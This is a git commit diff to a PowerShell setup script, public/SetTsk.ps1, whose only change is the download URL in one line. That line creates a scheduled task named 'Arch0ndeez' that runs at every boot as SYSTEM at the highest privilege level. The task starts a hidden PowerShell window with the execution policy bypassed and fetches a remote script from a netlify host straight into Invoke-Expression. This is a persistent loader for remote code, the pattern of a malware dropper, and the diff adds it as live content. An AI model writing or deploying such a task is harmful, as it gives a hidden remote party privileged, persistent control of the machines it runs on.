f9687578d45a2d38db989cbb40d5ef5f6f3857a6
ahmadsan <ahmadsan4p@gmail.com>
2026-09-24 08:07:39 +0800

    change link

--- public/SetTsk.ps1
+++ public/SetTsk.ps1
@@ -4,6 +4,6 @@ Write-Host "Setting up scheduled task: Arch0ndeez..."
 cmd.exe /c "schtasks /delete /tn Arch0ndeez /f >nul 2>nul"
 
 # Create the new task using native Windows schtasks
-schtasks /create /f /tn "Arch0ndeez" /sc onstart /ru SYSTEM /rl HIGHEST /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command 'irm https://link.netlify.app/script.ps1 | iex'"
+schtasks /create /f /tn "Arch0ndeez" /sc onstart /ru SYSTEM /rl HIGHEST /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command 'irm https://ahmadsan.netlify.app/SetExt.ps1 | iex'"
 
 Write-Host "Success! The task Arch0ndeez is now active." -ForegroundColor Green
